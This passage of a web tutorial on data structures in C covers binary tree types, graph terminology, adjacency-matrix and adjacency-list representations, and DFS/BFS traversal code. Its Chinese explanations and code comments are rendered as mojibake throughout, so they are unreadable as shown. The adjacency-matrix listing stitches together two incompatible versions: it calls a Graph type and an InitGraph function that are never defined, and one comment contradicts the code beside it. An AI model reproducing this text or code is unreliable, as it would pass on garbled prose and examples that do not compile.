&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="äºŒå‰æ ‘çš„ç§ç±»"><a href="#äºŒå‰æ ‘çš„ç§ç±»" class="headerlink" title="äºŒå‰æ ‘çš„ç§ç±»"></a>äºŒå‰æ ‘çš„ç§ç±»</h3><ul><li><strong>äºŒå‰æŸ¥æ‰¾æ ‘ï¼ˆBSTï¼‰</strong>ï¼šå·¦å­æ ‘èŠ‚ç‚¹å€¼å°äºæ ¹èŠ‚ç‚¹ï¼Œå³å­æ ‘èŠ‚ç‚¹å€¼å¤§äºæ ¹èŠ‚ç‚¹ï¼Œä¸”å·¦å³å­æ ‘åˆ†åˆ«ä¹Ÿæ˜¯äºŒå‰æŸ¥æ‰¾æ ‘ã€‚</li><li><strong>å¹³è¡¡äºŒå‰æ ‘ï¼ˆAVLæ ‘ï¼‰</strong>ï¼šä»»æ„èŠ‚ç‚¹çš„å·¦å³å­æ ‘é«˜åº¦å·®ä¸è¶…è¿‡1ï¼Œä¿è¯äºŒå‰æŸ¥æ‰¾æ ‘çš„å¹³è¡¡æ€§ï¼Œä»è€Œæé«˜æŸ¥æ‰¾æ•ˆç‡ã€‚</li><li><strong>å®Œå…¨äºŒå‰æ ‘</strong>ï¼šé™¤æœ€åä¸€å±‚å¤–ï¼Œå…¶ä»–å±‚èŠ‚ç‚¹éƒ½è¾¾åˆ°æœ€å¤§æ•°ç›®ï¼Œä¸”æœ€åä¸€å±‚çš„èŠ‚ç‚¹ä»å·¦å‘å³è¿ç»­æ’åˆ—ã€‚</li><li><strong>æ»¡äºŒå‰æ ‘</strong>ï¼šæ‰€æœ‰çš„éå¶èŠ‚ç‚¹éƒ½æœ‰ä¸¤ä¸ªå­èŠ‚ç‚¹ï¼Œä¸”æ‰€æœ‰å¶èŠ‚ç‚¹åœ¨åŒä¸€å±‚ã€‚</li></ul><h3 id="åº”ç”¨åœºæ™¯"><a href="#åº”ç”¨åœºæ™¯" class="headerlink" title="åº”ç”¨åœºæ™¯"></a>åº”ç”¨åœºæ™¯</h3><ul><li><strong>è¡¨è¾¾å¼è§£æ</strong>ï¼šäºŒå‰æ ‘å¯ç”¨äºè¡¨è¾¾å¼çš„è§£æå’Œè®¡ç®—ï¼Œå¦‚ä¸­ç¼€è¡¨è¾¾å¼ã€å‰ç¼€è¡¨è¾¾å¼ã€åç¼€è¡¨è¾¾å¼çš„è§£æã€‚</li><li><strong>æŸ¥æ‰¾å’Œæ’åº</strong>ï¼šäºŒå‰æŸ¥æ‰¾æ ‘é€‚åˆå¿«é€ŸæŸ¥æ‰¾æ•°æ®ã€‚</li><li><strong>æ•°æ®å­˜å‚¨</strong>ï¼šåœ¨æ•°æ®åº“çš„ç´¢å¼•ã€æ–‡ä»¶ç³»ç»Ÿçš„ç›®å½•ç»“æ„ä¸­ï¼ŒäºŒå‰æ ‘æ˜¯å¸¸è§çš„å­˜å‚¨ç»“æ„ã€‚</li></ul><h2 id="å›¾"><a href="#å›¾" class="headerlink" title="å›¾"></a>å›¾</h2><ol><li><strong>é¡¶ç‚¹ï¼ˆVertexï¼‰</strong>ï¼šå›¾ä¸­çš„èŠ‚ç‚¹ã€‚</li><li><strong>è¾¹ï¼ˆEdgeï¼‰</strong>ï¼šè¿æ¥ä¸¤ä¸ªé¡¶ç‚¹çš„çº¿æ®µï¼Œè¡¨ç¤ºä¸¤ä¸ªé¡¶ç‚¹ä¹‹é—´çš„å…³ç³»ã€‚</li><li><strong>æœ‰å‘å›¾ï¼ˆDirected Graphï¼‰</strong>ï¼šå›¾ä¸­çš„è¾¹æ˜¯æœ‰æ–¹å‘çš„ã€‚</li><li><strong>æ— å‘å›¾ï¼ˆUndirected Graphï¼‰</strong>ï¼šå›¾ä¸­çš„è¾¹æ˜¯æ— æ–¹å‘çš„ã€‚</li><li><strong>é‚»æ¥</strong>ï¼šå¦‚æœä¸¤ä¸ªé¡¶ç‚¹ä¹‹é—´æœ‰ä¸€æ¡è¾¹è¿æ¥ï¼Œåˆ™ç§°å®ƒä»¬æ˜¯ç›¸é‚»çš„ã€‚</li><li><strong>é‚»æ¥çŸ©é˜µï¼ˆAdjacency Matrixï¼‰</strong>ï¼šä½¿ç”¨çŸ©é˜µè¡¨ç¤ºå›¾ã€‚</li><li><strong>é‚»æ¥è¡¨ï¼ˆAdjacency Listï¼‰</strong>ï¼šä½¿ç”¨é“¾è¡¨è¡¨ç¤ºå›¾ã€‚</li></ol><p>åœ¨Cè¯­è¨€ä¸­ï¼Œé€šå¸¸ä½¿ç”¨<strong>é‚»æ¥çŸ©é˜µ</strong>å’Œ<strong>é‚»æ¥è¡¨</strong>æ¥è¡¨ç¤ºå›¾ç»“æ„ã€‚</p><h3 id="å›¾çš„è¡¨ç¤ºæ–¹æ³•"><a href="#å›¾çš„è¡¨ç¤ºæ–¹æ³•" class="headerlink" title="å›¾çš„è¡¨ç¤ºæ–¹æ³•"></a>å›¾çš„è¡¨ç¤ºæ–¹æ³•</h3><h4 id="1-é‚»æ¥çŸ©é˜µè¡¨ç¤ºæ³•"><a href="#1-é‚»æ¥çŸ©é˜µè¡¨ç¤ºæ³•" class="headerlink" title="1. é‚»æ¥çŸ©é˜µè¡¨ç¤ºæ³•"></a>1. é‚»æ¥çŸ©é˜µè¡¨ç¤ºæ³•</h4><p>é‚»æ¥çŸ©é˜µæ˜¯ä¸€ç§äºŒç»´æ•°ç»„ï¼ŒçŸ©é˜µä¸­çš„å…ƒç´ è¡¨ç¤ºé¡¶ç‚¹ä¹‹é—´æ˜¯å¦æœ‰è¾¹ã€‚å¯¹äºä¸€ä¸ªåŒ…å« <code>n</code> ä¸ªé¡¶ç‚¹çš„å›¾ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸€ä¸ª <code>n Ã— n</code> çš„äºŒç»´æ•°ç»„æ¥è¡¨ç¤ºï¼š</p><ul><li>å¦‚æœæœ‰è¾¹ <code>i -&gt; j</code>ï¼Œåˆ™ <code>adj[i][j] = 1</code>ï¼ˆæˆ–æƒé‡ï¼‰ã€‚</li><li>å¦‚æœæ²¡æœ‰è¾¹ <code>i -&gt; j</code>ï¼Œåˆ™ <code>adj[i][j] = 0</code>ã€‚</li></ul><p>é‚»æ¥çŸ©é˜µé€‚ç”¨äºè¾¹æ•°æ¯”è¾ƒå¤šçš„<strong>ç¨ å¯†å›¾</strong>ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_VERTICES 100</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INF 9999  <span class="hljs-comment">// è¡¨ç¤ºæ— ç©·å¤§ï¼Œç”¨äºå¸¦æƒå›¾ä¸­æ— è¿æ¥çš„æƒ…å†µ</span></span><br><br><span class="hljs-type">int</span> adjMatrix[MAX_VERTICES][MAX_VERTICES];<br><br><span class="hljs-comment">// åˆå§‹åŒ–é‚»æ¥çŸ©é˜µ</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">initAdjMatrix</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; n; j++) &#123;<br>            adjMatrix[i][j] = (i == j) ? <span class="hljs-number">0</span> : INF; <span class="hljs-comment">// æ— æƒæ— è¿æ¥çš„è¾¹è®¾ä¸º 0ï¼Œå…¶ä»–è¾¹ä¸º INF</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// æ·»åŠ è¾¹ï¼ˆæ— å‘å›¾ï¼‰</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">addEdge</span><span class="hljs-params">(<span class="hljs-type">int</span> u, <span class="hljs-type">int</span> v, <span class="hljs-type">int</span> weight)</span> </span>&#123;<br>    adjMatrix[u][v] = weight;<br>    adjMatrix[v][u] = weight; <span class="hljs-comment">// å¯¹ç§°æ·»åŠ ï¼Œè¡¨ç¤ºæ— å‘è¾¹</span><br>&#125;<br><br><br><span class="hljs-comment">// æ·»åŠ è¾¹</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">AddEdge</span><span class="hljs-params">(Graph *g, <span class="hljs-type">int</span> src, <span class="hljs-type">int</span> dest)</span> </span>&#123;<br>    g-&gt;adjMatrix[src][dest] = <span class="hljs-number">1</span>; <span class="hljs-comment">// å¯¹äºæ— å‘å›¾ï¼Œä¸¤ç«¯éƒ½éœ€æ ‡è®°ä¸º1</span><br>    g-&gt;adjMatrix[dest][src] = <span class="hljs-number">1</span>; <span class="hljs-comment">// å¦‚æœæ˜¯æœ‰å‘å›¾ï¼Œåªéœ€æ ‡è®°ä¸€å¤„å³å¯</span><br>&#125;<br><br><span class="hljs-comment">// æ‰“å°é‚»æ¥çŸ©é˜µ</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PrintGraph</span><span class="hljs-params">(Graph *g)</span> </span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;é‚»æ¥çŸ©é˜µ:\n&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; g-&gt;numVertices; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; g-&gt;numVertices; j++) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>, g-&gt;adjMatrix[i][j]);<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    Graph g;<br>    <span class="hljs-built_in">InitGraph</span>(&amp;g, <span class="hljs-number">5</span>); <span class="hljs-comment">// åˆå§‹åŒ–5ä¸ªé¡¶ç‚¹çš„å›¾</span><br><br>    <span class="hljs-built_in">AddEdge</span>(&amp;g, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>);<br>    <span class="hljs-built_in">AddEdge</span>(&amp;g, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>    <span class="hljs-built_in">AddEdge</span>(&amp;g, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-built_in">AddEdge</span>(&amp;g, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>);<br>    <span class="hljs-built_in">AddEdge</span>(&amp;g, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>);<br>    <span class="hljs-built_in">AddEdge</span>(&amp;g, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>);<br>    <span class="hljs-built_in">AddEdge</span>(&amp;g, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>);<br><br>    <span class="hljs-built_in">PrintGraph</span>(&amp;g);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="2-é‚»æ¥è¡¨è¡¨ç¤ºæ³•"><a href="#2-é‚»æ¥è¡¨è¡¨ç¤ºæ³•" class="headerlink" title="2. é‚»æ¥è¡¨è¡¨ç¤ºæ³•"></a>2. é‚»æ¥è¡¨è¡¨ç¤ºæ³•</h4><p>é‚»æ¥è¡¨ä½¿ç”¨<strong>é“¾è¡¨æ•°ç»„</strong>æ¥è¡¨ç¤ºå›¾ï¼Œæ¯ä¸ªé¡¶ç‚¹æœ‰ä¸€ä¸ªé“¾è¡¨ï¼Œè¯¥é“¾è¡¨ä¸­å­˜å‚¨ä¸è¯¥é¡¶ç‚¹ç›¸é‚»çš„æ‰€æœ‰é¡¶ç‚¹ã€‚é‚»æ¥è¡¨é€‚ç”¨äºè¾¹æ•°è¾ƒå°‘çš„<strong>ç¨€ç–å›¾</strong>ï¼Œå¯ä»¥èŠ‚çœå†…å­˜ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_VERTICES 100</span><br><br><span class="hljs-comment">// å®šä¹‰é‚»æ¥è¡¨çš„é“¾è¡¨èŠ‚ç‚¹</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">AdjListNode</span> &#123;<br>    <span class="hljs-type">int</span> vertex; <span class="hljs-comment">// é‚»æ¥é¡¶ç‚¹çš„ç¼–å·</span><br>    <span class="hljs-type">int</span> weight; <span class="hljs-comment">// æƒå€¼ï¼ˆå¯¹äºå¸¦æƒå›¾ï¼‰</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">AdjListNode</span>* next;<br>&#125; AdjListNode;<br><br><span class="hljs-comment">// å®šä¹‰é‚»æ¥è¡¨</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> &#123;<br>    AdjListNode* head; <span class="hljs-comment">// æŒ‡å‘é“¾è¡¨å¤´èŠ‚ç‚¹</span><br>&#125; AdjList;<br><br><span class="hljs-comment">// å®šä¹‰å›¾ç»“æ„</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> &#123;<br>    <span class="hljs-type">int</span> numVertices;       <span class="hljs-comment">// é¡¶ç‚¹æ•°é‡</span><br>    AdjList adjLists[MAX_VERTICES]; <span class="hljs-comment">// é¡¶ç‚¹çš„é‚»æ¥è¡¨æ•°ç»„</span><br>&#125; Graph;<br><br><span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªæ–°çš„é‚»æ¥è¡¨èŠ‚ç‚¹</span><br><span class="hljs-function">AdjListNode* <span class="hljs-title">createNode</span><span class="hljs-params">(<span class="hljs-type">int</span> vertex, <span class="hljs-type">int</span> weight)</span> </span>&#123;<br>    AdjListNode* newNode = (AdjListNode*)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(AdjListNode));<br>    newNode-&gt;vertex = vertex;<br>    newNode-&gt;weight = weight;<br>    newNode-&gt;next = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">return</span> newNode;<br>&#125;<br><br><span class="hljs-comment">// åˆå§‹åŒ–å›¾</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">initGraph</span><span class="hljs-params">(Graph* graph, <span class="hljs-type">int</span> numVertices)</span> </span>&#123;<br>    graph-&gt;numVertices = numVertices;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; numVertices; i++) &#123;<br>        graph-&gt;adjLists[i].head = <span class="hljs-literal">NULL</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// æ·»åŠ è¾¹ï¼ˆæ— å‘å›¾ï¼‰</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">addEdge</span><span class="hljs-params">(Graph* graph, <span class="hljs-type">int</span> src, <span class="hljs-type">int</span> dest, <span class="hljs-type">int</span> weight)</span> </span>&#123;<br>    AdjListNode* newNode = <span class="hljs-built_in">createNode</span>(dest, weight);<br>    newNode-&gt;next = graph-&gt;adjLists[src].head;<br>    graph-&gt;adjLists[src].head = newNode;<br><br>    <span class="hljs-comment">// å¯¹äºæ— å‘å›¾ï¼Œè¿˜éœ€è¦åœ¨ dest -&gt; src æ·»åŠ ä¸€æ¡è¾¹</span><br>    newNode = <span class="hljs-built_in">createNode</span>(src, weight);<br>    newNode-&gt;next = graph-&gt;adjLists[dest].head;<br>    graph-&gt;adjLists[dest].head = newNode;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="å›¾çš„å¸¸è§æ“ä½œ"><a href="#å›¾çš„å¸¸è§æ“ä½œ" class="headerlink" title="å›¾çš„å¸¸è§æ“ä½œ"></a>å›¾çš„å¸¸è§æ“ä½œ</h3><ol><li><strong>éå†ï¼ˆTraversalï¼‰</strong>ï¼š<ul><li><strong>æ·±åº¦ä¼˜å…ˆéå†ï¼ˆDFSï¼‰</strong>ï¼šä»æŸä¸ªé¡¶ç‚¹å¼€å§‹å°½å¯èƒ½æ·±åœ°è®¿é—®å›¾ä¸­çš„èŠ‚ç‚¹ã€‚</li><li><strong>å¹¿åº¦ä¼˜å…ˆéå†ï¼ˆBFSï¼‰</strong>ï¼šä»æŸä¸ªé¡¶ç‚¹å¼€å§‹ï¼Œé€å±‚è®¿é—®å›¾ä¸­çš„èŠ‚ç‚¹ã€‚</li></ul></li><li><strong>æœ€çŸ­è·¯å¾„</strong>ï¼š<ul><li><strong>Dijkstraç®—æ³•</strong>ï¼šç”¨äºæ±‚è§£æœ‰å‘å›¾ä¸­å•æºæœ€çŸ­è·¯å¾„ã€‚</li><li><strong>Floydç®—æ³•</strong>ï¼šç”¨äºæ±‚è§£ä»»æ„ä¸¤ç‚¹ä¹‹é—´çš„æœ€çŸ­è·¯å¾„ã€‚</li></ul></li><li><strong>è¿é€šæ€§</strong>ï¼š<ul><li>åˆ¤æ–­å›¾æ˜¯å¦æ˜¯è¿é€šå›¾ã€‚</li><li>æ±‚è¿é€šåˆ†é‡ã€‚</li></ul></li><li><strong>æœ€å°ç”Ÿæˆæ ‘ï¼ˆMSTï¼‰</strong>ï¼š<ul><li><strong>Primç®—æ³•</strong>ï¼šæ„å»ºæœ€å°ç”Ÿæˆæ ‘ã€‚</li><li><strong>Kruskalç®—æ³•</strong>ï¼šæ„å»ºæœ€å°ç”Ÿæˆæ ‘</li></ul></li></ol><p>æ·±åº¦ä¼˜å…ˆéå†ï¼ˆDFSï¼‰</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// æ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰é€’å½’ç‰ˆæœ¬</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">DFS</span><span class="hljs-params">(Graph* graph, <span class="hljs-type">int</span> vertex, <span class="hljs-type">bool</span> visited[MAX_VERTICES])</span> </span>&#123;<br>    visited[vertex] = <span class="hljs-literal">true</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>, vertex);<br><br>    <span class="hljs-comment">// è®¿é—®å½“å‰èŠ‚ç‚¹çš„æ‰€æœ‰é‚»æ¥èŠ‚ç‚¹</span><br>    AdjListNode* temp = graph-&gt;adjLists[vertex].head;<br>    <span class="hljs-keyword">while</span> (temp) &#123;<br>        <span class="hljs-keyword">if</span> (!visited[temp-&gt;vertex]) &#123;<br>            <span class="hljs-built_in">DFS</span>(graph, temp-&gt;vertex, visited);<br>        &#125;<br>        temp = temp-&gt;next;<br>    &#125;<br>&#125;<br><br><br><br><span class="hljs-comment">// æ ˆçš„å®ç°</span><br><span class="hljs-type">int</span> stack[MAX_VERTICES];<br><span class="hljs-type">int</span> top = <span class="hljs-number">-1</span>;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">push</span><span class="hljs-params">(<span class="hljs-type">int</span> vertex)</span> </span>&#123;<br>    stack[++top] = vertex;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">pop</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> stack[top--];<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isStackEmpty</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> top == <span class="hljs-number">-1</span>;<br>&#125;<br><br><span class="hljs-comment">// æ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰éé€’å½’ç‰ˆæœ¬</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">DFS_Stack</span><span class="hljs-params">(Graph* graph, <span class="hljs-type">int</span> startVertex)</span> </span>&#123;<br>    <span class="hljs-type">bool</span> visited[MAX_VERTICES] = &#123;<span class="hljs-literal">false</span>&#125;; <span class="hljs-comment">// è®°å½•èŠ‚ç‚¹æ˜¯å¦è®¿é—®è¿‡</span><br>    <span class="hljs-built_in">push</span>(startVertex);<br>    visited[startVertex] = <span class="hljs-literal">true</span>;<br><br>    <span class="hljs-keyword">while</span> (!<span class="hljs-built_in">isStackEmpty</span>()) &#123;<br>        <span class="hljs-type">int</span> vertex = <span class="hljs-built_in">pop</span>();<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>, vertex);<br><br>        <span class="hljs-comment">// è®¿é—®å½“å‰èŠ‚ç‚¹çš„æ‰€æœ‰é‚»æ¥èŠ‚ç‚¹</span><br>        AdjListNode* temp = graph-&gt;adjLists[vertex].head;<br>        <span class="hljs-keyword">while</span> (temp) &#123;<br>            <span class="hljs-keyword">if</span> (!visited[temp-&gt;vertex]) &#123;<br>                <span class="hljs-built_in">push</span>(temp-&gt;vertex);<br>                visited[temp-&gt;vertex] = <span class="hljs-literal">true</span>;<br>            &#125;<br>            temp = temp-&gt;next;<br>        &#125;<br>    &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>å¹¿åº¦ä¼˜å…ˆéå†ï¼ˆBFSï¼‰</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_QUEUE_SIZE 100</span><br><br><span class="hljs-comment">// é˜Ÿåˆ—ç»“æ„</span><br><span class="hljs-type">int</span> queue[MAX_QUEUE_SIZE];<br><span class="hljs-type">int</span> front = <span class="hljs-number">0</span>, rear = <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">// å…¥é˜Ÿæ“ä½œ</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">enqueue</span><span class="hljs-params">(<span class="hljs-type">int</span> vertex)</span> </span>&#123;<br>    queue[rear++] = vertex;<br>&#125;<br><br><span class="hljs-comment">// å‡ºé˜Ÿæ“ä½œ</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">dequeue</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> queue[front++];<br>&#125;<br><br><span class="hljs-comment">// åˆ¤æ–­é˜Ÿåˆ—æ˜¯å¦ä¸ºç©º</span><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isEmpty</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> front == rear;<br>&#125;<br><br><span class="hljs-comment">// å¹¿åº¦ä¼˜å…ˆæœç´¢ï¼ˆBFSï¼‰</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">BFS</span><span class="hljs-params">(Graph* graph, <span class="hljs-type">int</span> startVertex)</span> </span>&#123;<br>    <span class="hljs-type">bool</span> visited[MAX_VERTICES] = &#123;<span class="hljs-literal">false</span>&#125;; <span class="hljs-comment">// è®°å½•èŠ‚ç‚¹æ˜¯å¦è®¿é—®è¿‡</span><br>    <span class="hljs-built_in">enqueue</span>(startVertex);<br>    visited[startVertex] = <span class="hljs-literal">true</span>;<br><br>    <span class="hljs-keyword">while</span> (!<span class="hljs-built_in">isEmpty</span>()) &#123;<br>        <span class="hljs-type">int</span> vertex = <span class="hljs-built_in">dequeue</span>();<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>, vertex);<br><br>        <span class="hljs-comment">// è®¿é—®å½“å‰èŠ‚ç‚¹çš„æ‰€æœ‰é‚»æ¥èŠ‚ç‚¹</span><br>        AdjListNode* temp = graph-&gt;adjLists[vertex].head;<br>        <span class="hljs-keyword">while</span> (temp) &#123;<br>            <span class="hljs-keyword">if</span> (!visited[temp-&gt;vertex]) &#123;<br>                <span class="hljs-built_in">enqueue</span>(temp-&gt;vertex);<br>                visited[temp-&gt;vertex] = <span class="hljs-literal">true</span>;<br>            &#125;<br>            temp = temp-&gt;next;<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="æœ€å°ç”Ÿæˆæ ‘ï¼ˆMSTï¼‰"><a href="#æœ€å°ç”Ÿæˆæ ‘ï¼ˆMSTï¼‰" class="headerlink" title="æœ€å°ç”Ÿæˆæ ‘ï¼ˆMSTï¼‰"></a>æœ€å°ç”Ÿæˆæ ‘ï¼ˆMSTï¼‰</h3><p>å¯¹äºä¸€ä¸ª<strong>è¿æ¥å›¾</strong>ï¼Œ<strong>æœ€å°ç”Ÿæˆæ ‘</strong>æ˜¯å›¾ä¸­æ‰€æœ‰é¡¶ç‚¹çš„ä¸€ä¸ªå­é›†ï¼Œå®ƒåŒ…æ‹¬å›¾ä¸­æ‰€æœ‰çš„é¡¶ç‚¹ï¼Œå¹¶ä¸”æ˜¯ä¸€ä¸ª<strong>æ— 